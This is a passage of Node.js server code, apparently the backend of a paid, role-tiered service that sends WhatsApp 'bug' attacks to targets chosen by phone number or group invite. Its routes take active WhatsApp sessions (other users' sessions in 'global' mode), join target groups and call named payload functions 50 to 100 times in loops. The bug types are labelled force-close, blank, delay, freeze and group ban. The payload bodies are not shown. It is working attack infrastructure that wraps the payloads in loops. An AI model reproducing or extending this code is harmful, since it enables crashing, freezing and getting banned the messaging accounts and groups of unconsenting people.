        allowedRoles = ["owner", "reseller", "vip", "member"];
        break;
      case "reseller":
        allowedRoles = ["reseller", "vip", "member"];
        break;
      case "vip":
        allowedRoles = ["vip", "member"];
        break;
      case "member":
        allowedRoles = ["member"];
        break;
      default:
        allowedRoles = ["member"];
    }
    
    const activeSenders = [];
    
    for (const allowedRole of allowedRoles) {
      const usersWithRole = db.filter(u => u.role === allowedRole);
      for (const potentialUser of usersWithRole) {
        const potentialSock = await checkActiveSessionInFolder(potentialUser.username);
        if (potentialSock) {
          activeSenders.push({
            sock: potentialSock,
            username: potentialUser.username,
            role: potentialUser.role
          });
        }
      }
    }
    
    if (activeSenders.length === 0) {
      console.warn(`[❌ GLOBAL MODE] Tidak ada sender aktif.`);
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: 'Tidak ada sender aktif',
        sender: 'none',
        error_type: 'no_sender_available',
        sender_mode: 'global'
      });
      
      return res.json({
        valid: true,
        sended: false,
        no_sender: true,
        sender_mode: 'global',
        role: role,
        message: 'Tidak ada global sender aktif yang tersedia.'
      });
    }
    
    allSenders = activeSenders;
    console.log(`[✅ GLOBAL MODE] Ditemukan ${allSenders.length} sender aktif`);
    
    sock = allSenders[0].sock;
    senderInfo = allSenders[0].username;
    actualSender = sock;
  }

  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown - Last send updated`);

  if (selectedSenderMode === "global") {
    const limitUsed = useGlobalLimit(user.username, role);
    if (!limitUsed) {
      return res.json({
        valid: true,
        sended: false,
        limit_exceeded: true,
        message: "Gagal menggunakan limit. Silahkan coba lagi."
      });
    }
  }

  logDelivery(key, originalTarget, {
    type: 'group_bug',
    bugType: bug,
    status: 'pending',
    message: 'Group bug sedang diproses di background',
    sender: senderInfo
  });

  const processId = Date.now() + Math.random();
  
  const limitInfo = selectedSenderMode === "global" ? getUserLimitInfo(user.username, role) : null;
  
  const processEntry = {
    id: processId,
    username: user.username,
    user_role: user.role,
    target: originalTarget,
    bug_type: bug,
    status: 'pending',
    message: 'Memulai proses group bug...',
    progress: 0,
    total_steps: 100,
    current_step: 0,
    sender: senderInfo,
    sender_role: selectedSenderMode === 'private' ? user.role : 'global',
    sender_mode: selectedSenderMode,
    timestamp: new Date().toISOString(),
    timeString: new Date().toLocaleString('id-ID', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }) + ' WIB',
    logs: []
  };

  activeBugProcesses.push(processEntry);

  addBugLog({
    username: user.username,
    user_role: user.role,
    target: originalTarget,
    bug_type: bug,
    status: 'pending',
    message: 'Group bug dimulai',
    sender: senderInfo,
    sender_mode: selectedSenderMode,
    error_type: null,
    process_id: processId
  });

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role: role,
    sender: senderInfo,
    sender_mode: selectedSenderMode,
    message: `Group bug sedang diproses di background menggunakan ${selectedSenderMode} sender`,
    process_id: processId,
    limit_info: limitInfo
  });

  setImmediate(async () => {
    console.log(`[🚀 BACKGROUND GROUP BUG] Memulai proses...`);
    console.log(`- User: ${user.username}`);
    console.log(`- Role: ${role}`);
    console.log(`- Target: ${originalTarget}`);
    console.log(`- Bug: ${bug}`);
    console.log(`- Sender Mode: ${selectedSenderMode}`);
    console.log(`- Process ID: ${processId}`);
    console.log(`- Total Senders Available: ${allSenders.length}`);
    
    updateBugProcess(processId, { 
      status: 'processing', 
      message: 'Mempersiapkan sender untuk group...',
      progress: 5
    });
    
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    const checkSenderInGroup = async (sock, groupJid) => {
      try {
        const metadata = await sock.groupMetadata(groupJid);
        if (metadata && metadata.participants) {
          const myId = sock.user?.id || sock.authState?.creds?.me?.id;
          if (myId) {
            const isParticipant = metadata.participants.some(p => p.id === myId);
            return isParticipant;
          }
        }
        return false;
      } catch (e) {
        console.log(`[⚠️ CHECK GROUP] Gagal cek keanggotaan: ${e.message}`);
        return false;
      }
    };

    const joinGroupWithRetry = async (sock, inviteCode, senderUsername, retryCount = 0) => {
      const maxRetries = 3;
      
      try {
        console.log(`[🔗 JOIN ATTEMPT ${retryCount + 1}] Sender: ${senderUsername}`);
        
        let groupInfo;
        try {
          groupInfo = await sock.groupGetInviteInfo(inviteCode);
        } catch (e) {
          if (e.message && e.message.includes('not found')) {
            throw new Error(`Group not found or invite expired`);
          }
          throw new Error(`Failed to get group info: ${e.message}`);
        }
        
        const groupJid = groupInfo.id;
        console.log(`[📋 GROUP] ${groupInfo.subject} (${groupJid})`);
        
        const alreadyInGroup = await checkSenderInGroup(sock, groupJid);
        
        if (alreadyInGroup) {
          console.log(`[✅ ALREADY IN GROUP] ${senderUsername} sudah di group`);
          return { success: true, groupJid, groupInfo, sender: senderUsername, alreadyJoined: true };
        }
        
        console.log(`[🔗 ATTEMPTING JOIN] ${senderUsername} mencoba join...`);
        
        try {
          await sock.groupAcceptInvite(inviteCode);
          console.log(`[✅ JOIN SUCCESS] ${senderUsername} berhasil join group`);
          return { success: true, groupJid, groupInfo, sender: senderUsername, alreadyJoined: false };
        } catch (e) {
          const errorMsg = e.message || '';
          
          const isActuallyInGroup = await checkSenderInGroup(sock, groupJid);
          if (isActuallyInGroup) {
            console.log(`[✅ ALREADY IN GROUP (detected after join attempt)] ${senderUsername} sudah di group`);
            return { success: true, groupJid, groupInfo, sender: senderUsername, alreadyJoined: true };
          }
          
          if (errorMsg.includes('full')) {
            throw new Error(`Group is full!`);
          }
          
          if (errorMsg.includes('account_reachout_restricted') || errorMsg.includes('reachout')) {
            if (selectedSenderMode === 'private') {
              const checkAgain = await checkSenderInGroup(sock, groupJid);
              if (checkAgain) {
                return { success: true, groupJid, groupInfo, sender: senderUsername, alreadyJoined: true };
              }
            }
            throw new Error(`Account restricted - cannot join group`);
          }
          
          if (retryCount < maxRetries) {
            console.log(`[🔄 RETRY ${retryCount + 1}/${maxRetries}] ${senderUsername} akan dicoba ulang...`);
            await sleep(3000);
            return await joinGroupWithRetry(sock, inviteCode, senderUsername, retryCount + 1);
          }
          
          throw new Error(`Failed to join: ${errorMsg}`);
        }
      } catch (err) {
        if (retryCount < maxRetries) {
          console.log(`[🔄 RETRY ${retryCount + 1}/${maxRetries}] ${senderUsername} error: ${err.message}`);
          await sleep(3000);
          return await joinGroupWithRetry(sock, inviteCode, senderUsername, retryCount + 1);
        }
        throw err;
      }
    };
    
    const processGroupBug = async () => {
      let inviteCode = null;
      let groupJid = null;
      
      if (isGroupInvite) {
        inviteCode = target.match(groupRegex)[1];
        console.log(`[👥 GROUP INVITE] Invite Code: ${inviteCode}`);
      } else if (isGroupJid) {
        groupJid = target;
        console.log(`[👥 GROUP JID] ${groupJid}`);
      }
      
      let joinedSender = null;
      let joinedGroupJid = null;
      let joinedGroupInfo = null;
      let senderAlreadyJoined = false;
      
      console.log(`[🔄 STEP 1] Mencoba join group dengan ${allSenders.length} sender...`);
      
      for (let i = 0; i < allSenders.length; i++) {
        const sender = allSenders[i];
        console.log(`[👤 TRY SENDER ${i + 1}/${allSenders.length}] ${sender.username} (${sender.role})`);
        
        updateBugProcess(processId, { 
          message: `Mencoba join group dengan ${sender.username}... (${i + 1}/${allSenders.length})`,
          progress: 10 + Math.round((i / allSenders.length) * 30)
        });
        
        try {
          let result;
          
          if (isGroupInvite) {
            result = await joinGroupWithRetry(sender.sock, inviteCode, sender.username);
          } else {
            const alreadyInGroup = await checkSenderInGroup(sender.sock, groupJid);
            if (alreadyInGroup) {
              console.log(`[✅ ALREADY IN GROUP] ${sender.username} sudah di group`);
              let groupInfo;
              try {
                groupInfo = await sender.sock.groupMetadata(groupJid);
              } catch (e) {
                groupInfo = { subject: 'Unknown', id: groupJid };
              }
              result = { 
                success: true, 
                groupJid: groupJid, 
                groupInfo: groupInfo, 
                sender: sender.username, 
                alreadyJoined: true 
              };
            } else {
              try {
                await sender.sock.groupAcceptInvite(groupJid);
                console.log(`[✅ JOIN SUCCESS] ${sender.username} berhasil join group`);
                let groupInfo;
                try {
                  groupInfo = await sender.sock.groupMetadata(groupJid);
                } catch (e) {
                  groupInfo = { subject: 'Unknown', id: groupJid };
                }
                result = { 
                  success: true, 
                  groupJid: groupJid, 
                  groupInfo: groupInfo, 
                  sender: sender.username, 
                  alreadyJoined: false 
                };
              } catch (e) {
                throw new Error(`Failed to join: ${e.message}`);
              }
            }
          }
          
          if (result.success) {
            joinedSender = sender;
            joinedGroupJid = result.groupJid;
            joinedGroupInfo = result.groupInfo;
            senderAlreadyJoined = result.alreadyJoined || false;
            console.log(`[✅ FOUND WORKING SENDER] ${sender.username} berhasil (already joined: ${senderAlreadyJoined})`);
            break;
          }
        } catch (err) {
          console.log(`[❌ SENDER FAILED] ${sender.username}: ${err.message}`);
          
          addBugLog({
            username: user.username,
            user_role: user.role,
            target: originalTarget,
            bug_type: bug,
            status: 'failed',
            message: `Sender ${sender.username} gagal: ${err.message}`,
            sender: sender.username,
            sender_mode: selectedSenderMode,
            error_type: 'join_group_failed',
            process_id: processId
          });
        }
      }
      
      if (!joinedSender) {
        console.log(`[❌ ALL SENDERS FAILED] Tidak ada sender yang berhasil join group`);
        
        updateBugProcess(processId, { 
          status: 'failed', 
          message: 'Semua sender gagal join group',
          progress: 0,
          error_type: 'all_senders_failed'
        });
        
        logDelivery(key, originalTarget, {
          type: 'group_bug',
          bugType: bug,
          status: 'failed',
          message: 'Semua sender gagal join group',
          sender: 'all'
        });
        
        addBugLog({
          username: user.username,
          user_role: user.role,
          target: originalTarget,
          bug_type: bug,
          status: 'failed',
          message: 'Semua sender gagal join group',
          sender: 'all',
          sender_mode: selectedSenderMode,
          error_type: 'all_senders_failed',
          process_id: processId
        });
        
        try {
          await bot.sendMessage(OWNER_ID, 
            `❌ *GROUP BUG GAGAL - ALL SENDERS FAILED*\n\n` +
            `*User:* ${user.username} (${role})\n` +
            `*Group:* ${originalTarget}\n` +
            `*Bug:* ${bug}\n` +
            `*Status:* Semua sender gagal join group\n` +
            `*Total Senders:* ${allSenders.length}\n` +
            `*Waktu:* ${new Date().toLocaleString('id-ID')}`, 
            { parse_mode: 'Markdown' }
          );
        } catch (e) {}
        
        return false;
      }
      
      console.log(`[✅ JOIN COMPLETE] Menggunakan sender: ${joinedSender.username}`);
      console.log(`[📋 GROUP JID] ${joinedGroupJid}`);
      console.log(`[📋 ALREADY JOINED] ${senderAlreadyJoined ? 'YES' : 'NO'}`);
      
      if (!senderAlreadyJoined) {
        console.log(`[⏳ WAITING] Menunggu 5 detik sebelum kirim pesan...`);
        updateBugProcess(processId, { 
          message: `Join group success! Tunggu 5 detik...`,
          progress: 50
        });
        await sleep(5000);
      } else {
        console.log(`[⏭️ SKIP WAITING] Sender sudah di group, lanjut kirim...`);
        updateBugProcess(processId, { 
          message: `Sender sudah di group, mengirim bug...`,
          progress: 50
        });
        await sleep(1000);
      }
      
      console.log(`[🐛 STEP 4] Menjalankan bug '${bug}' ke ${joinedGroupJid}`);
      updateBugProcess(processId, { 
        message: `Mengirim bug ke group...`,
        progress: 55
      });
      
      try {
        await bot.sendMessage(OWNER_ID, 
          `🔄 *GROUP BUG PROCESSING*\n\n` +
          `*User:* ${user.username} (${role})\n` +
          `*Group:* ${joinedGroupInfo ? joinedGroupInfo.subject : 'Unknown'}\n` +
          `*Bug:* ${bug}\n` +
          `*Sender:* ${joinedSender.username}\n` +
          `*Status:* ${senderAlreadyJoined ? 'Sudah di group, mengirim...' : 'Join success, mengirim...'}\n` +
          `*Waktu:* ${new Date().toLocaleString('id-ID')}`, 
          { parse_mode: 'Markdown' }
        );
      } catch (e) {}
      
      try {
        switch (bug) {            
        
          case "ban_group":
            for (let i = 0; i < 50; i++) {
              if (!joinedSender.sock) throw new Error("Koneksi sock hilang");
              await MakloGwBan(joinedSender.sock, joinedGroupJid);
              await sleep(1000);
              if (i % 50 === 0) {
                updateBugProcess(processId, { 
                  progress: 55 + Math.round((i / 100) * 45),
                  message: `Mengirim ban_group... ${i + 1}/1000`
                });
              }
            }
            break;
            
            case "ban_group1":
            for (let i = 0; i < 50; i++) {
              if (!joinedSender.sock) throw new Error("Koneksi sock hilang");
              await groupBan1(joinedSender.sock, joinedGroupJid);
              await sleep(1000);
              if (i % 50 === 0) {
                updateBugProcess(processId, { 
                  progress: 55 + Math.round((i / 100) * 45),
                  message: `Mengirim ban_group... ${i + 1}/1000`
                });
              }
            }
            break;
            
          default:
            console.log(`[❌ BUG] Tipe bug '${bug}' tidak dikenal untuk group`);
            throw new Error(`Tipe bug '${bug}' tidak dikenal`);
        }
        
        console.log(`[✅ GROUP BUG SUCCESS] ${bug} berhasil dikirim ke ${joinedGroupJid}`);
        
        updateBugProcess(processId, { 
          status: 'completed', 
          message: `Group bug berhasil dikirim!`,
          progress: 100
        });
        
        logDelivery(key, originalTarget, {
          type: 'group_bug',
          bugType: bug,
          status: 'success',
          message: `Group bug ${bug} berhasil dikirim menggunakan ${joinedSender.username}`,
          sender: joinedSender.username
        });
        
        addBugLog({
          username: user.username,
          user_role: user.role,
          target: originalTarget,
          bug_type: bug,
          status: 'success',
          message: `Group bug berhasil dikirim`,
          sender: joinedSender.username,
          sender_mode: selectedSenderMode,
          error_type: null,
          process_id: processId
        });
        
        if (!user.stats) user.stats = { totalSent: 0, totalSuccess: 0, totalFailed: 0, executionsByBug: {} };
        user.stats.totalSent = (user.stats.totalSent || 0) + 1;
        user.stats.totalSuccess = (user.stats.totalSuccess || 0) + 1;
        if (!user.stats.executionsByBug[bug]) user.stats.executionsByBug[bug] = 0;
        user.stats.executionsByBug[bug]++;
        saveDatabase(db);
        
        try {
          await bot.sendMessage(OWNER_ID, 
            `✅ *GROUP BUG BERHASIL DIKIRIM*\n\n` +
            `*User:* ${user.username} (${role})\n` +
            `*Group:* ${joinedGroupInfo ? joinedGroupInfo.subject : 'Unknown'}\n` +
            `*Bug:* ${bug}\n` +
            `*Sender:* ${joinedSender.username}\n` +
            `*Sender Mode:* ${selectedSenderMode.toUpperCase()}\n` +
            `*Status:* ${senderAlreadyJoined ? 'Sudah di group' : 'Join & send'}\n` +
            `*Waktu:* ${new Date().toLocaleString('id-ID')}`, 
            { parse_mode: 'Markdown' }
          );
        } catch (e) {}
        
        return true;
        
      } catch (bugErr) {
        console.log(`[❌ BUG EXECUTION ERROR] ${bugErr.message}`);
        throw bugErr;
      }
    };
    
    try {
      await processGroupBug();
    } catch (err) {
      console.error(`[❌ FATAL] Error di background process:`, err);
      
      updateBugProcess(processId, { 
        status: 'failed', 
        message: err.message || 'Fatal error',
        error_type: 'fatal',
        progress: 0
      });
      
      logDelivery(key, originalTarget, {
        type: 'group_bug',
        bugType: bug,
        status: 'failed',
        message: err.message || 'Fatal error',
        sender: senderInfo
      });
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: err.message || 'Fatal error',
        sender: senderInfo,
        sender_mode: selectedSenderMode,
        error_type: 'fatal',
        process_id: processId
      });
      
      if (!user.stats) user.stats = { totalSent: 0, totalSuccess: 0, totalFailed: 0, executionsByBug: {} };
      user.stats.totalSent = (user.stats.totalSent || 0) + 1;
      user.stats.totalFailed = (user.stats.totalFailed || 0) + 1;
      saveDatabase(db);
      
      try {
        await bot.sendMessage(OWNER_ID, 
          `❌ *GROUP BUG GAGAL DIKIRIM*\n\n` +
          `*User:* ${user.username} (${role})\n` +
          `*Target:* ${originalTarget}\n` +
          `*Bug:* ${bug}\n` +
          `*Error:* ${err.message || 'Unknown error'}\n` +
          `*Waktu:* ${new Date().toLocaleString('id-ID')}`, 
          { parse_mode: 'Markdown' }
        );
      } catch (e) {}
    }
  });
});
        
app.get("/sendBug", async (req, res) => {
  const { key, bug, senderMode } = req.query;
  let { target } = req.query;
  
  const selectedSenderMode = senderMode || "global";
  const originalTarget = target;
  const cleanedTarget = (target || "").replace(/\D/g, "");
  
  console.log(`[📤 BUG] Send bug request received`);
  console.log(`- Key: ${key}`);
  console.log(`- Target Original: ${originalTarget}`);
  console.log(`- Target Cleaned: ${cleanedTarget}`);
  console.log(`- Bug: ${bug}`);
  console.log(`- Sender Mode: ${selectedSenderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    
    logDelivery(key, originalTarget, {
      type: 'bug',
      bugType: bug,
      status: 'failed',
      message: 'Key tidak valid atau sudah kadaluarsa',
      sender: 'unknown'
    });
    
    addBugLog({
      username: 'unknown',
      user_role: 'unknown',
      target: originalTarget,
      bug_type: bug,
      status: 'failed',
      message: 'Key tidak valid',
      sender: 'unknown',
      error_type: 'invalid_key'
    });
    
    return res.json({ 
      valid: false,
      sended: false,
      message: "Key tidak valid atau sudah kadaluarsa"
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    
    logDelivery(key, originalTarget, {
      type: 'bug',
      bugType: bug,
      status: 'failed',
      message: 'User tidak ditemukan dalam database',
      sender: 'unknown'
    });
    
    addBugLog({
      username: keyInfo.username,
      user_role: 'unknown',
      target: originalTarget,
      bug_type: bug,
      status: 'failed',
      message: 'User tidak ditemukan di database',
      sender: 'unknown',
      error_type: 'user_not_found'
    });
    
    return res.json({ 
      valid: false,
      sended: false,
      message: "User tidak ditemukan dalam database"
    });
  }

  const roleCooldowns = {
    founder: 10,
    owner: 20,
    reseller: 30,
    vip: 60,
    member: 120,
  };
  
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown - ${diffSeconds} detik dari ${cooldownSeconds} detik`);
    
    const waitTime = cooldownSeconds - diffSeconds;
    
    logDelivery(key, originalTarget, {
      type: 'bug',
      bugType: bug,
      status: 'failed',
      message: `Cooldown, tunggu ${waitTime} detik lagi`,
      sender: 'unknown'
    });
    
    addBugLog({
      username: user.username,
      user_role: user.role,
      target: originalTarget,
      bug_type: bug,
      status: 'failed',
      message: `Cooldown ${waitTime}s`,
      sender: 'unknown',
      error_type: 'cooldown',
      wait_time: waitTime
    });
    
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: waitTime,
      role: role,
      message: `Tunggu ${waitTime} detik sebelum mengirim lagi`
    });
  }

  if (selectedSenderMode === "global") {
    const globalAccess = canUseGlobalSender(user.username, role);
    
    if (!globalAccess.allowed) {
      console.log(`[❌ GLOBAL LIMIT] ${user.username} tidak bisa pakai global: ${globalAccess.reason}`);
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: globalAccess.reason,
        sender: 'none',
        error_type: 'limit_exceeded',
        sender_mode: 'global'
      });
      
      return res.json({
        valid: true,
        sended: false,
        limit_exceeded: true,
        sender_mode: 'global',
        role: role,
        message: globalAccess.reason,
        limit_info: {
          remaining: globalAccess.remaining,
          resetAt: globalAccess.resetAt
        }
      });
    }
  }

  let sock = null;
  let senderInfo = "unknown";
  let actualSender = null;

  console.log(`[🔍 CEK SENDER] Mode: ${selectedSenderMode} untuk user ${user.username} (${role})`);

  if (selectedSenderMode === "private") {
    console.log(`[🔍 PRIVATE MODE] Mencari session pribadi untuk ${user.username}`);
    sock = await checkActiveSessionInFolder(user.username);
    senderInfo = user.username;
    
    if (!sock) {
      console.warn(`[❌ PRIVATE MODE] Tidak ada koneksi aktif untuk ${user.username}.`);
      
      logDelivery(key, originalTarget, {
        type: 'bug',
        bugType: bug,
        status: 'failed',
        message: 'Private sender tidak aktif',
        sender: senderInfo
      });
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: 'Private sender tidak aktif',
        sender: senderInfo,
        error_type: 'private_sender_offline',
        sender_mode: 'private'
      });
      
      return res.json({
        valid: true,
        sended: false,
        no_sender: true,
        sender_mode: 'private',
        role: role,
        message: `Private sender Anda (${user.username}) tidak aktif.`
      });
    } else {
      console.log(`[✅ PRIVATE MODE] ${user.username} memiliki session aktif`);
      actualSender = sock;
    }
  } else {
    console.log(`[🌐 GLOBAL MODE] Mencari available sender untuk ${user.username} dengan role ${role}`);
    
    let hasGlobalAccess = false;
    let allowedRoles = [];
    
    switch (role) {
      case "founder":
        hasGlobalAccess = true;
        allowedRoles = ["owner", "reseller", "vip", "member"];
        break;
      case "owner":
        hasGlobalAccess = true;
        allowedRoles = ["reseller", "vip", "member"];
        break;
      case "reseller":
        hasGlobalAccess = true;
        allowedRoles = ["vip", "member"];
        break;
      case "vip":
        hasGlobalAccess = true;
        allowedRoles = ["member"];
        break;
      case "member":
        hasGlobalAccess = false;
        break;
      default:
        hasGlobalAccess = false;
    }
    
    if (!hasGlobalAccess) {
      console.warn(`[❌ GLOBAL MODE] ${role} tidak memiliki akses ke global sender`);
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: 'Tidak memiliki akses global sender',
        sender: 'none',
        error_type: 'no_global_access',
        sender_mode: 'global'
      });
      
      return res.json({
        valid: true,
        sended: false,
        access_denied: true,
        no_sender: true,
        sender_mode: 'global',
        role: role,
        message: `Role ${role.toUpperCase()} tidak memiliki akses ke global sender.`
      });
    }
    
    console.log(`[🌐 GLOBAL MODE] Mencari sender dengan roles: ${allowedRoles.join(', ')}`);
    
    const activeSenders = [];
    
    for (const allowedRole of allowedRoles) {
      const usersWithRole = db.filter(u => u.role === allowedRole);
      for (const potentialUser of usersWithRole) {
        const potentialSock = await checkActiveSessionInFolder(potentialUser.username);
        if (potentialSock) {
          activeSenders.push({
            sock: potentialSock,
            username: potentialUser.username,
            role: potentialUser.role
          });
        }
      }
    }
    
    if (activeSenders.length === 0) {
      console.warn(`[❌ GLOBAL MODE] Tidak ada sender aktif dengan roles: ${allowedRoles.join(', ')}`);
      
      if (role === "founder") {
        const ownerUsers = db.filter(u => u.role === "owner");
        for (const ownerUser of ownerUsers) {
          const ownerSock = await checkActiveSessionInFolder(ownerUser.username);
          if (ownerSock) {
            activeSenders.push({
              sock: ownerSock,
              username: ownerUser.username,
              role: ownerUser.role
            });
            break;
          }
        }
      }
      
      if (role === "owner" && activeSenders.length === 0) {
        const resellerUsers = db.filter(u => u.role === "reseller");
        for (const resellerUser of resellerUsers) {
          const resellerSock = await checkActiveSessionInFolder(resellerUser.username);
          if (resellerSock) {
            activeSenders.push({
              sock: resellerSock,
              username: resellerUser.username,
              role: resellerUser.role
            });
            break;
          }
        }
      }
    }
    
    if (activeSenders.length === 0) {
      console.warn(`[❌ GLOBAL MODE] Tidak ada global sender aktif.`);
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: 'Tidak ada global sender aktif',
        sender: 'none',
        error_type: 'no_global_sender_available',
        sender_mode: 'global'
      });
      
      return res.json({
        valid: true,
        sended: false,
        no_sender: true,
        sender_mode: 'global',
        role: role,
        message: 'Tidak ada global sender aktif yang tersedia.'
      });
    }
    
    const selectedSender = activeSenders[0];
    sock = selectedSender.sock;
    senderInfo = selectedSender.username;
    actualSender = sock;
    
    console.log(`[✅ GLOBAL MODE] Menggunakan sender: ${senderInfo} (role: ${selectedSender.role})`);
  }

  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown - Last send updated`);

  if (selectedSenderMode === "global") {
    const limitUsed = useGlobalLimit(user.username, role);
    if (!limitUsed) {
      return res.json({
        valid: true,
        sended: false,
        limit_exceeded: true,
        message: "Gagal menggunakan limit. Silahkan coba lagi."
      });
    }
  }

  logDelivery(key, originalTarget, {
    type: 'bug',
    bugType: bug,
    status: 'pending',
    message: 'Bug sedang diproses di background',
    sender: senderInfo
  });

  const processId = Date.now() + Math.random();
  
  const limitInfo = selectedSenderMode === "global" ? getUserLimitInfo(user.username, role) : null;
  
  const processEntry = {
    id: processId,
    username: user.username,
    user_role: user.role,
    target: originalTarget,
    bug_type: bug,
    status: 'pending',
    message: 'Memulai proses bug...',
    progress: 0,
    total_steps: 100,
    current_step: 0,
    sender: senderInfo,
    sender_role: selectedSenderMode === 'private' ? user.role : 'global',
    sender_mode: selectedSenderMode,
    timestamp: new Date().toISOString(),
    timeString: new Date().toLocaleString('id-ID', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }) + ' WIB',
    logs: []
  };

  activeBugProcesses.push(processEntry);

  addBugLog({
    username: user.username,
    user_role: user.role,
    target: originalTarget,
    bug_type: bug,
    status: 'pending',
    message: 'Bug dimulai',
    sender: senderInfo,
    sender_mode: selectedSenderMode,
    error_type: null,
    process_id: processId
  });

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role: role,
    sender: senderInfo,
    sender_mode: selectedSenderMode,
    message: `Bug sedang diproses di background menggunakan ${selectedSenderMode} sender`,
    process_id: processId,
    limit_info: limitInfo
  });

  setImmediate(async () => {
    console.log(`[🚀 BACKGROUND] Memulai proses bug di background...`);
    console.log(`- User: ${user.username}`);
    console.log(`- Role: ${role}`);
    console.log(`- Target: ${originalTarget}`);
    console.log(`- Bug: ${bug}`);
    console.log(`- Sender: ${senderInfo}`);
    console.log(`- Sender Mode: ${selectedSenderMode}`);
    console.log(`- Process ID: ${processId}`);
    
    updateBugProcess(processId, { 
      status: 'processing', 
      message: 'Mengirim bug...',
      progress: 5
    });
    
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    const attemptSend = async (sock, retry = false) => {
      try {
        const cleanNumber = target.replace(/\D/g, "");
        const targetJid = cleanNumber + "@s.whatsapp.net";
        
        console.log(`[📞 MODE NOMOR] ${targetJid}`);
        
        if (!targetJid || targetJid === "@s.whatsapp.net") {
          throw new Error("Target tidak valid");
        }
        
        try {
          await bot.sendMessage(OWNER_ID, 
            `🔄 *MEMPROSES BUG*\n\n` +
            `*User:* ${user.username} (${role})\n` +
            `*Target:* ${originalTarget}\n` +
            `*Target JID:* ${targetJid}\n` +
            `*Type:* NUMBER\n` +
            `*Bug:* ${bug}\n` +
            `*Sender:* ${senderInfo}\n` +
            `*Sender Mode:* ${selectedSenderMode.toUpperCase()}\n` +
            `*Status:* Sedang mengirim...\n` +
            `*Waktu:* ${new Date().toLocaleString('id-ID')}`, 
            { parse_mode: 'Markdown' }
          );
        } catch (e) {}
        
        console.log(`[🐛 BUG] Menjalankan bug '${bug}' ke ${targetJid}`);
        
        switch (bug) {
          case "fc":
            for (let i = 0; i < 100; i++) {
            await xfc(sock, targetJid);
            await Fclunihh(sock, targetJid);
            }
            break;
            
          case "blank":
            for (let i = 0; i < 100; i++) {
              await BlankXaka(sock, targetJid);       
              await DelayFreze(sock, targetJid);
            }
            break;
            
          case "delay1":
            for (let i = 0; i < 100; i++) {
              await Delay(sock, targetJid);       
              await DelayFreze(sock, targetJid);
            }
            break;
            
          case "delay":
            for (let i = 0; i < 100; i++) {
              await delyblnk(sock, targetJid);
              await sleep(500);   
              await Delay(sock, targetJid);
            }
            break;
            
          case "blank1":
            for (let i = 0; i < 100; i++) {
              await DelayFreze(sock, targetJid);       
              await DelayV7(sock, targetJid);
            }
            break;
            
          case "frezee":
            for (let i = 0; i < 100; i++) {
            await FreezeDelayinvisHard(sock, targetJid);
              await sleep(500);
            }
            break;
            
            case "buldo":
            for (let i = 0; i < 100; i++) {
            await paysply(sock, targetJid);
              await sleep(500);
            }
            break;
            
          default:
            console.log(`[❌ BUG] Tipe bug '${bug}' tidak dikenal`);
            
            logDelivery(key, originalTarget, {
              type: 'bug',
              bugType: bug,
              status: 'failed',
              message: `Tipe bug '${bug}' tidak dikenal`,
              sender: senderInfo
            });
            
            updateBugProcess(processId, { 
              status: 'failed', 
              message: `Tipe bug '${bug}' tidak dikenal`,
              progress: 0,
              error_type: 'unknown_bug_type'
            });
            
            addBugLog({
              username: user.username,
              user_role: user.role,
              target: originalTarget,
              bug_type: bug,
              status: 'failed',
              message: `Tipe bug tidak dikenal`,
              sender: senderInfo,
              sender_mode: selectedSenderMode,
              error_type: 'unknown_bug_type',
              process_id: processId
            });
            
            return false;
        }

        console.log(`[✅ BUG] Bug '${bug}' berhasil dikirim ke ${originalTarget}`);
        
        updateBugProcess(processId, { 
          status: 'completed', 
          message: `Bug berhasil dikirim`,
          progress: 100
        });
        
        logDelivery(key, originalTarget, {
          type: 'bug',
          bugType: bug,
          status: 'success',
          message: `Bug ${bug} berhasil dikirim`,
          sender: senderInfo
        });
        
        addBugLog({
          username: user.username,
          user_role: user.role,
          target: originalTarget,
          bug_type: bug,
          status: 'success',
          message: `Bug berhasil dikirim`,
          sender: senderInfo,
          sender_mode: selectedSenderMode,
          error_type: null,
          process_id: processId
        });
        
        if (!user.stats) user.stats = { totalSent: 0, totalSuccess: 0, totalFailed: 0, executionsByBug: {} };
        user.stats.totalSent = (user.stats.totalSent || 0) + 1;
        user.stats.totalSuccess = (user.stats.totalSuccess || 0) + 1;
        if (!user.stats.executionsByBug[bug]) user.stats.executionsByBug[bug] = 0;
        user.stats.executionsByBug[bug]++;
        saveDatabase(db);
        
        try {
          await bot.sendMessage(OWNER_ID, 
            `✅ *BUG BERHASIL DIKIRIM*\n\n` +
            `*User:* ${user.username} (${role})\n` +
            `*Target:* ${originalTarget}\n` +
            `*Bug:* ${bug}\n` +
            `*Sender:* ${senderInfo}\n` +
            `*Sender Mode:* ${selectedSenderMode.toUpperCase()}\n` +
            `*Waktu:* ${new Date().toLocaleString('id-ID')}`, 
            { parse_mode: 'Markdown' }
          );
        } catch (e) {}
